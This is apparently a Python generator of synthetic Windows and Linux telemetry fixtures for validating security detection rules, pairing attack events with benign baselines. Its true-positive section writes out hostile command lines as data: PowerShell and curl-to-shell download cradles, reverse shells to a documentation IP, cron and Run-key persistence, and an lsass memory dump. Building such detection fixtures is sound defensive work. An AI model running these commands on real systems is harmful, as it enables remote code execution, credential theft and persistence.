#!/usr/bin/env python3
"""Generate the synthetic telemetry corpus used to validate the detections.

Events are written deterministically from a fixed base time so that regenerating the corpus
produces no diff. Nothing here is captured from a real host: the fields are modelled on what
Elastic Agent with Sysmon and the Windows Security channel produce, which is enough to exercise
the rules without shipping anyone's logs.
"""

from __future__ import annotations

import json
from datetime import UTC, datetime, timedelta
from pathlib import Path

BASE = datetime(2026, 3, 2, 9, 15, 0, tzinfo=UTC)
ROOT = Path(__file__).resolve().parents[1] / "telemetry"


def ts(offset_seconds: int) -> str:
    return (BASE + timedelta(seconds=offset_seconds)).isoformat().replace("+00:00", "Z")


def proc(
    offset,
    *,
    name,
    cmdline,
    parent="explorer.exe",
    user="WORKSTATION\\jdoe",
    host="WKS-014",
    executable=None,
    extra=None,
):
    event = {
        "@timestamp": ts(offset),
        "event": {
            "category": ["process"],
            "type": ["start"],
            "action": "process_started",
            "code": "1",
            "provider": "Microsoft-Windows-Sysmon",
        },
        "host": {"name": host},
        "user": {"name": user},
        "process": {
            "name": name,
            "executable": executable or f"C:\\Windows\\System32\\{name}",
            "command_line": cmdline,
            "parent": {"name": parent},
        },
        "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 1},
    }
    if extra:
        event.update(extra)
    return event


def lproc(offset, *, name, cmdline, parent="bash", user="deploy", host="app-prod-02"):
    return {
        "@timestamp": ts(offset),
        "event": {"category": ["process"], "type": ["start"], "action": "exec"},
        "host": {"name": host, "os": {"type": "linux"}},
        "user": {"name": user},
        "process": {
            "name": name,
            "executable": f"/usr/bin/{name}",
            "command_line": cmdline,
            "parent": {"name": parent},
        },
    }


def failed_logon(offset, *, user, source_ip, host="DC-01"):
    return {
        "@timestamp": ts(offset),
        "event": {
            "category": ["authentication"],
            "type": ["start"],
            "outcome": "failure",
            "code": "4625",
            "provider": "Microsoft-Windows-Security-Auditing",
        },
        "host": {"name": host},
        "user": {"name": user},
        "source": {"ip": source_ip},
        "winlog": {"channel": "Security", "event_id": 4625, "logon_type": 3},
    }


TRUE_POSITIVES: dict[str, list[dict]] = {
    "powershell_encoded_command": [
        proc(
            0,
            name="powershell.exe",
            parent="winword.exe",
            cmdline="powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCk=",
        ),
        proc(
            5,
            name="powershell.exe",
            cmdline="powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGgAaQA=",
        ),
        proc(9, name="pwsh.exe", cmdline="pwsh -NoProfile -ec YQBiAGMA"),
    ],
    "powershell_download_cradle": [
        proc(
            20,
            name="powershell.exe",
            parent="outlook.exe",
            cmdline="powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.20/a.ps1')\"",
        ),
        proc(
            24,
            name="powershell.exe",
            cmdline="powershell -Command Invoke-Expression (Invoke-WebRequest -Uri http://198.51.100.20/p).Content",
        ),
    ],
    "office_spawns_interpreter": [
        proc(
            40,
            name="cmd.exe",
            parent="winword.exe",
            cmdline="cmd.exe /c certutil -urlcache -f http://198.51.100.31/x.exe x.exe",
        ),
        proc(
            44, name="mshta.exe", parent="excel.exe", cmdline="mshta.exe http://198.51.100.31/a.hta"
        ),
        proc(
            47,
            name="wscript.exe",
            parent="outlook.exe",
            cmdline="wscript.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\invoice.js",
        ),
    ],
    "service_creation_remote_exec": [
        {
            "@timestamp": ts(60),
            "event": {
                "category": ["configuration"],
                "code": "7045",
                "provider": "Service Control Manager",
            },
            "host": {"name": "SRV-FILE-01"},
            "user": {"name": "CORP\\svc_backup"},
            "service": {"name": "PSEXESVC"},
            "file": {"path": "C:\\Windows\\PSEXESVC.exe"},
            "winlog": {"channel": "System", "event_id": 7045},
        },
        {
            "@timestamp": ts(64),
            "event": {
                "category": ["configuration"],
                "code": "7045",
                "provider": "Service Control Manager",
            },
            "host": {"name": "SRV-APP-03"},
            "user": {"name": "CORP\\admin"},
            "service": {"name": "RemComSvc"},
            "file": {"path": "C:\\Windows\\RemComSvc.exe"},
            "winlog": {"channel": "System", "event_id": 7045},
        },
    ],
    "scheduled_task_persistence": [
        proc(
            80,
            name="schtasks.exe",
            parent="cmd.exe",
            cmdline='schtasks.exe /create /sc minute /mo 5 /tn Updater /tr "powershell -w hidden -f C:\\Users\\Public\\u.ps1"',
        ),
    ],
    "lsass_credential_access": [
        {
            "@timestamp": ts(100),
            "event": {
                "category": ["process"],
                "type": ["access"],
                "code": "10",
                "provider": "Microsoft-Windows-Sysmon",
            },
            "host": {"name": "WKS-014"},
            "user": {"name": "WORKSTATION\\jdoe"},
            "process": {
                "name": "rundll32.exe",
                "executable": "C:\\Windows\\System32\\rundll32.exe",
                "target": {"name": "C:\\Windows\\System32\\lsass.exe"},
                "access_mask": "0x1410",
            },
            "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 10},
        },
        proc(
            104,
            name="rundll32.exe",
            parent="cmd.exe",
            cmdline="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 704 C:\\Users\\Public\\lsass.dmp full",
        ),
    ],
    "registry_run_key_persistence": [
        {
            "@timestamp": ts(120),
            "event": {
                "category": ["registry"],
                "type": ["change"],
                "code": "13",
                "provider": "Microsoft-Windows-Sysmon",
            },
            "host": {"name": "WKS-014"},
            "user": {"name": "WORKSTATION\\jdoe"},
            "process": {"name": "powershell.exe"},
            "registry": {
                "path": "HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
                "data": {"strings": ["powershell -w hidden -f C:\\Users\\Public\\u.ps1"]},
            },
            "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 13},
        },
    ],
    "lolbin_proxy_execution": [
        proc(
            140,
            name="regsvr32.exe",
            parent="cmd.exe",
            cmdline="regsvr32.exe /s /n /u /i:http://198.51.100.44/x.sct scrobj.dll",
        ),
        proc(
            144,
            name="rundll32.exe",
            parent="explorer.exe",
            cmdline="rundll32.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.dll,DllMain",
        ),
    ],
    "curl_piped_to_shell": [
        lproc(160, name="bash", cmdline="curl -fsSL http://198.51.100.61/i.sh | bash"),
        lproc(164, name="sh", cmdline="wget -qO- http://198.51.100.61/i.sh | sudo sh"),
    ],
    "reverse_shell_invocation": [
        lproc(180, name="bash", cmdline="bash -i >& /dev/tcp/198.51.100.77/4444 0>&1"),
        lproc(184, name="ncat", cmdline="ncat 198.51.100.77 4444 -e /bin/bash"),
        lproc(
            188,
            name="python3",
            cmdline='python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("198.51.100.77",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh"])\'',
        ),
    ],
    "cron_persistence": [
        lproc(
            200,
            name="bash",
            parent="sh",
            cmdline="/bin/bash -c \"(crontab -l; echo '*/5 * * * * curl -s http://198.51.100.61/b | bash') | crontab -\"",
        ),
    ],
    "sudo_privilege_escalation": [
        lproc(220, name="sudo", cmdline="sudo /bin/bash", user="deploy"),
        lproc(224, name="sudo", cmdline="sudo python3", user="ciuser"),
    ],
}

BENIGN: list[dict] = [
    proc(
        300,
        name="powershell.exe",
        parent="explorer.exe",
        cmdline="powershell.exe -NoProfile -File C:\\Scripts\\Get-DiskReport.ps1",
    ),
    proc(
        302,
        name="powershell.exe",
        parent="services.exe",
        cmdline="powershell.exe -Command Get-Service -Name Spooler | Select-Object Status",
    ),
    proc(
        304,
        name="powershell.exe",
        parent="explorer.exe",
        cmdline="powershell.exe -Command Invoke-WebRequest -Uri https://intranet.corp/report.csv -OutFile C:\\Reports\\report.csv",
    ),
    proc(306, name="cmd.exe", parent="explorer.exe", cmdline="cmd.exe /c dir C:\\Projects"),
    proc(
        308,
        name="winword.exe",
        parent="explorer.exe",
        cmdline='"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n',
    ),
    proc(
        310,
        name="rundll32.exe",
        parent="explorer.exe",
        cmdline="rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
    ),
    proc(
        312,
        name="regsvr32.exe",
        parent="msiexec.exe",
        cmdline='regsvr32.exe /s "C:\\Program Files\\Vendor\\component.dll"',
    ),
    proc(
        314,
        name="schtasks.exe",
        parent="msiexec.exe",
        user="NT AUTHORITY\\SYSTEM$",
        cmdline='schtasks.exe /create /tn VendorUpdate /tr "C:\\Program Files\\Vendor\\update.exe" /sc daily',
    ),
    {
        "@timestamp": ts(316),
        "event": {
            "category": ["configuration"],
            "code": "7045",
            "provider": "Service Control Manager",
        },
        "host": {"name": "SRV-APP-03"},
        "user": {"name": "NT AUTHORITY\\SYSTEM"},
        "service": {"name": "VendorAgent"},
        "file": {"path": "C:\\Program Files\\Vendor\\agent.exe"},
        "winlog": {"channel": "System", "event_id": 7045},
    },
    {
        "@timestamp": ts(318),
        "event": {
            "category": ["registry"],
            "type": ["change"],
            "code": "13",
            "provider": "Microsoft-Windows-Sysmon",
        },
        "host": {"name": "WKS-014"},
        "user": {"name": "WORKSTATION\\jdoe"},
        "process": {"name": "msiexec.exe"},
        "registry": {
            "path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\VendorTray",
            "data": {"strings": ['"C:\\Program Files\\Vendor\\tray.exe" /background']},
        },
        "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 13},
    },
    {
        "@timestamp": ts(320),
        "event": {
            "category": ["process"],
            "type": ["access"],
            "code": "10",
            "provider": "Microsoft-Windows-Sysmon",
        },
        "host": {"name": "WKS-014"},
        "user": {"name": "NT AUTHORITY\\SYSTEM"},
        "process": {
            "name": "MsMpEng.exe",
            "executable": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
            "target": {"name": "C:\\Windows\\System32\\lsass.exe"},
            "access_mask": "0x1410",
        },
        "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 10},
    },
    lproc(
        330, name="curl", cmdline="curl -fsSL https://registry.internal/health -o /tmp/health.json"
    ),
    lproc(332, name="bash", cmdline="bash /opt/deploy/release.sh --env prod"),
    lproc(334, name="sudo", cmdline="sudo systemctl restart nginx"),
    lproc(336, name="sudo", cmdline="sudo /usr/bin/apt-get update"),
    lproc(
        338, name="crontab", parent="dpkg", cmdline="crontab -u root /etc/cron.d/vendor-logrotate"
    ),
    lproc(340, name="python3", cmdline="python3 /opt/app/manage.py migrate"),
    lproc(342, name="ncat", cmdline="ncat -z -v registry.internal 443"),
    failed_logon(350, user="jdoe", source_ip="10.20.1.15"),
    failed_logon(360, user="jdoe", source_ip="10.20.1.15"),
    failed_logon(400, user="asmith", source_ip="10.20.1.31"),
]

# Ten failures for one account inside five minutes, plus one source spraying eleven accounts.
CORRELATION_EVENTS: list[dict] = [
    failed_logon(1000 + i * 20, user="mrossi", source_ip="203.0.113.55") for i in range(10)
] + [failed_logon(2000 + i * 45, user=f"user{i:02d}", source_ip="203.0.113.99") for i in range(11)]


def write(path: Path, events: list[dict]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as handle:
        for event in events:
            handle.write(json.dumps(event, sort_keys=True) + "\n")


def main() -> None:
    for stem, events in TRUE_POSITIVES.items():
        write(ROOT / "true_positive" / f"{stem}.jsonl", events)
    write(ROOT / "benign" / "workstation_and_server_baseline.jsonl", BENIGN)
    write(ROOT / "true_positive" / "authentication_bursts.jsonl", CORRELATION_EVENTS)

    total_tp = sum(len(v) for v in TRUE_POSITIVES.values()) + len(CORRELATION_EVENTS)
    print(f"wrote {total_tp} true-positive and {len(BENIGN)} benign events to {ROOT}")


if __name__ == "__main__":
    main()
